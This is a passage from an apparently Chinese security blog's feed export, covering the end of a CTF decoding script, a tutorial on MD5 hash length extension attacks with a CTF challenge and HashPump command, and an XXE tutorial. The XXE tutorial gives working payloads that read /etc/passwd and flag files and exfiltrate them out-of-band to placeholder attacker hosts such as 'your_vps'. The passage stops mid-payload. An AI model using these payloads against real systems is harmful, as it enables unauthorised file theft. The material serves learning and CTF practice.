class="number">-1</span>]))</span><br><span class="line">        equalnum=line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(bin_str),<span class="number">8</span>)]))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> GXY </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希扩展长度攻击学习</title>
      <link href="2019/12/16/hash-extend-attack/"/>
      <url>2019/12/16/hash-extend-attack/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了hash扩展长度攻击主要方式及原理！！！</p><a id="more"></a><h2 id="hash原理"><a href="#hash原理" class="headerlink" title="hash原理"></a>hash原理</h2><p><img src="/2019/12/16/hash-extend-attack/9113969-b94ef1797456d888.png"></p><p>首先，当hash函数拿到需要被hash的字符串后，先将其字节长度整除64，取得余数。如果该余数正好等于56，那么就在该字符串最后添加上8个字节的长度描述符（具体用bit表示）。如果不等于56，就先对字符串进行长度填充，填充时第一个字节为hex(80)，其他字节均用hex(00)填充，填充至余数为56后，同样增加8个字节的长度描述符（该长度描述符为需要被hash的字符串的长度，不是填充之后整个字符串的长度）。以上过程，称之为补位。</p><p>补位完成后，字符串以64位一组进行分组（因为上面的余数为56,加上8个字节的长度描述符后，正好是64位，凑成一组）。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的registers值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的registers值就是最后的hash值。</p><p>为确保同一个字符串的hash值唯一，所以需要保证第一次registers的值也唯一。所以在hash算法中，registers具有初始值。如上图中的registers值0。</p><h2 id="md5的加密过程"><a href="#md5的加密过程" class="headerlink" title="md5的加密过程"></a>md5的加密过程</h2><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算 </p><p>我们关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。 </p><p>MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量IV，这一点很关键！！！</p><h3 id="补位"><a href="#补位" class="headerlink" title="补位"></a>补位</h3><p>举个例子：假设我们要对某个字符串MD5加密，首先先转换成16进制</p><p><img src="/2019/12/16/hash-extend-attack/20191230010751.png"></p><p>注意：字符是以ASCII码存在的，ASCII码转换成二进制数存在，每个字符相当于一字节(1byte)即8位(8bit)</p><p>而MD5加密的过程中会判断<code>len(message) % 512bit</code>是否为448bit。如果是的话，就在后面填充8个字节(64bit)的长度描述符，如果不是，则在其后面填充hex(80)即而进行二进制的<code>100000000</code>，然后再填充hex(00)直到长度%512bit=448bit，然后就是填充8个字节的长度描述符</p><h3 id="补长度"><a href="#补长度" class="headerlink" title="补长度"></a>补长度</h3><p>长度描述符的填充内容即为原加密字符串的的bit长度，例如示例是4个字节，32bit，对应16进制就是<code>0x0000000000000020</code>，由于填充时是小端序放的，那么填充的数据将会是小端序存放的，即<code>0x2000000000000000</code></p><p><img src="/2019/12/16/hash-extend-attack/20191230015639.png"></p><h3 id="计算消息摘要"><a href="#计算消息摘要" class="headerlink" title="计算消息摘要"></a>计算消息摘要</h3><p>计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit的消息（即64字节）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A&#x3D;0x67452301 </span><br><span class="line">B&#x3D;0xefcdab89 </span><br><span class="line">C&#x3D;0x98badcfe </span><br><span class="line">D&#x3D;0x10325476 </span><br></pre></td></tr></table></figure><p>（注意这里这4个值是在md5算法中<code>写死的</code>，<code>写死的</code>。。。。）<br>我们不需要关心计算细节，我们只需要知道经过一次消息摘要后，上面的链变量将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>hash长度扩展的大概意思就是：</p><p>已知<code>secret</code>长度，<code>data</code>值，以及<code>secret+data</code>的hash值，就可以求出<code>secret+其他数据</code>的hash值</p><h2 id="HashPump"><a href="#HashPump" class="headerlink" title="HashPump"></a>HashPump</h2><p>HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。</p><p>安装步骤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line"><span class="built_in">cd</span> HashPump</span><br><span class="line">make</span><br></pre></td></tr></table></figure><h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><h3 id="实验吧"><a href="#实验吧" class="headerlink" title="实验吧"></a>实验吧</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">setcookie(<span class="string">&quot;sample-hash&quot;</span>, md5($secret . urldecode(<span class="string">&quot;admin&quot;</span> . <span class="string">&quot;admin&quot;</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"><span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line">$username = $_POST[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">$password = $_POST[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">&quot;getmein&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">&quot;admin&quot;</span> &amp;&amp; urldecode($password) != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_COOKIE[<span class="string">&quot;getmein&quot;</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulations! You are a registered user.\n&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The flag is &quot;</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;You are not an admin! LEAVE.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>抓包在Cookie里我们看到了<code>$secret+&#39;adminadmin&#39;</code>的MD5值，现在我们只需要求<code>$secret+&#39;admin&#39;+其他值</code>的MD5值就能得到flag，已知<code>$secret</code>长度为15，加上admin长度为20，此时我们就能用hashpump</p><img src="/2019/12/16/hash-extend-attack/TIM截图20200423145553.png" style="zoom:80%;"><p>还可以直接用命令行形式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s 49848099cde7e537e5fe4d88d0ba90f8 -d admin -k 20 -a moonback</span><br></pre></td></tr></table></figure><img src="/2019/12/16/hash-extend-attack/TIM截图20200423150026.png" style="zoom:80%;"><p>把<code>\x</code>替换成<code>%</code></p><img src="/2019/12/16/hash-extend-attack/TIM截图20200423145731.png" style="zoom: 80%;"><p>可以看到成功得到flag</p><h3 id="JarvisOJ"><a href="#JarvisOJ" class="headerlink" title="JarvisOJ"></a>JarvisOJ</h3><p><a href="https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C">https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#flag在管理员手里</a></p><h3 id="NPUCTF"><a href="#NPUCTF" class="headerlink" title="NPUCTF"></a>NPUCTF</h3><p>参见:<a href="http://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C">http://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C</a></p><p>参考：</p><p><a href="https://blog.blacsheep.cn/2017/12/10/md5%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/">https://blog.blacsheep.cn/2017/12/10/md5长度扩展攻击/</a></p><p><a href="https://gtfly.github.io/2019/03/21/Hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/">https://gtfly.github.io/2019/03/21/Hash长度扩展攻击学习/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE学习</title>
      <link href="2019/12/14/xxe-study/"/>
      <url>2019/12/14/xxe-study/</url>
      
        <content type="html"><![CDATA[<p>本篇博客简单介绍了XXE漏洞的原理和常见利用方式！！！</p><a id="more"></a><h2 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE?"></a>什么是XXE?</h2><p>XXE漏洞全称<code>XML External Entity Injection</code>，即xml外部实体注入漏洞</p><p>有可能造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害</p><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件</p><h2 id="XXE漏洞代码"><a href="#XXE漏洞代码" class="headerlink" title="XXE漏洞代码"></a>XXE漏洞代码</h2><p>以buuoj上Real部分<code>[PHP]XXE</code>为例，上面有三个文件：</p><p><strong>simplexml_load_string.php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$xml = simplexml_load_string($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure><p><strong>SimpleXMLElement.php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$xml = <span class="keyword">new</span> SimpleXMLElement($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure><p><strong>dom.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($data);</span><br><span class="line"></span><br><span class="line">print_r($dom);</span><br></pre></td></tr></table></figure><p>我们可以构造下面的payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=/var/www/html/dom.php&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>了解XXE一定要了解XML一些经常使用的语法！</p><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;!--XML申明--&gt;</span><br><span class="line">&lt;!--文档类型定义--&gt;</span><br><span class="line">&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Mooback&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;Moonback&lt;&#x2F;from&gt;</span><br><span class="line">&lt;head&gt;XXE&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;I am learning XML.&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure><p>用浏览器打开可以看到<br><img src="/2019/12/14/xxe-study/20191214205015.png"></p><h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><p>实体是对数据的引用。</p><p>实体可在内部或外部进行声明，一般分为字符实体，命名实体，外部实体，参数实体，所有实体（除参数实体外）都以一个与字符（&amp;）开始，以一个分号（;）结束。</p><p><strong>字符实体：</strong></p><p>对于字符实体，我们可以用十进制格式（<code>&amp;#nnn;</code>，其中 <em>nnn</em> 是字符的十进制值）或十六进制格式（<code>&amp;#xhhh;</code>，其中<em>hhh</em> 是字符的十六进制值）来指定任意 Unicode 字符。</p><p>举个例子：大写字母 A 是 Unicode 字符 <code>U+0065</code>。如果想将其表示为一个字符实体，可以输入 <code>&amp;#65;</code>（十进制值）或 <code>&amp;#xa9;</code>（十六进制值）</p><p><strong>命名实体(内部实体)：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>命名实体在 DTD 或内部子集（即文档中 &lt;!DOCTYPE&gt; 语句的一部分）中声明，在文档中用作引用。在 XML 文档解析过程中，实体引用将由它的表示替代。</p><p><strong>外部实体:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>外部实体表示外部文件的内容，在有些情况下很有用，比如说，您在创建一本图书并且想将每一章存储为一个单独的文件。您可能会创建一组如下所示的实体。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY chap1 SYSTEM &quot;chapter-1.xml&quot;&gt;</span><br><span class="line">&lt;!ENTITY chap2 SYSTEM &quot;chapter-2.xml&quot;&gt;</span><br><span class="line">&lt;!ENTITY chap3 SYSTEM &quot;chapter-3.xml&quot;&gt;</span><br></pre></td></tr></table></figure><p>现在，当您在主图书 XML 文件中将这些实体放到一起时，这些文件的内容将插入在引用点。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">chap1</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;chapter-1.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">chap2</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;chapter-2.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">chap3</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;chapter-3.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">&amp;chap1;</span></span><br><span class="line"><span class="meta">&amp;chap2;</span></span><br><span class="line"><span class="meta">&amp;chap3;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>由于这些文件的内容被插入到 XML 文档中，因此它们也必须是有效的 XML，而且它们必须是平衡的.当上面的 XML 文档被解析时，它将被读取为一个大文档，包含 <code>chapter-1.xml</code>、<code>chapter-2.xml</code> 和 <code>chapter-3.xml</code> 文件的内容。</p><p><strong>参数实体：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>参数实体只用于 DTD 和文档的内部子集中。它们使用百分号（%）而不是与字符，可以是命名实体或外部实体。</p><p><strong>注意点：</strong></p><ul><li>参数实体必须定义在单独的DTD文档中或XML文档的DTD区(但是引用只能在DTD文档中，即外部子集，而不能在XML文档的DTD区)，前者为该XML文档的外部子集，后者为该XML文档的内部子集。</li><li>参数实体的作用是作为DTD中的元素的条件控制。参数实体定义以%作为开头，引用也以%开头，以;结尾</li></ul><p>语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？</p><p>主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：<br><img src="/2019/12/14/xxe-study/1.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://yourhost/test.xml&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;ticket&gt;&lt;username&gt;&amp;file;&lt;&#x2F;username&gt;&lt;code&gt;dsad&lt;&#x2F;code&gt;&lt;&#x2F;ticket&gt;</span><br></pre></td></tr></table></figure><h4 id="引入服务器DTD文件Blind-XXE-OOB"><a href="#引入服务器DTD文件Blind-XXE-OOB" class="headerlink" title="引入服务器DTD文件Blind XXE(OOB)"></a>引入服务器DTD文件Blind XXE(OOB)</h4><p><strong>第一种方式：</strong></p><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://your_vps/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>vps上的test.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;your_vps&#x2F;get.php?file&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>注意：如果定义成参数实体的话<code>%</code>需要实体编码</p><p><strong>第二种方式:</strong></p><p>自己vps上的dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;myip:10001&#x2F;?%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://myip/xml.dtd&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用的<code>php://filter</code>将文件内容进行了base64编码，因为当我们读取的文件是php或则html文件时，文件的代码包含<code>&lt; &gt;</code>符号时会导致解析错误</p><p>让存在漏洞的地方先加载自己服务器上的dtd文件，然后让其请求并带上利用php伪协议base64加密的文件内容，通过服务端的日志即可做到不回显的任意文件读取</p><p><strong>第三种方式:</strong></p><p>vps上的<code>test.dtd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1:9001?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;msg&gt;&lt;id&gt;moonback&lt;&#x2F;id&gt;&lt;name&gt;aasd&lt;&#x2F;name&gt;&lt;level&gt;1000&lt;&#x2F;level&gt;&lt;time&gt;415441&lt;&#x2F;time&gt;&lt;&#x2F;msg&gt;</span><br></pre></td></tr></table></figure><p>这种的好处是没有<code>file://</code>,<code>php://filter</code>等关键词</p><h4 id="基于报错的Blind-XXE"><a href="#基于报错的Blind-XXE" class="headerlink" title="基于报错的Blind XXE"></a>基于报错的Blind XXE</h4><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据</p><p><strong>通过引入服务器文件</strong></p><p>xml.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;hhhhhhh&#x2F;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 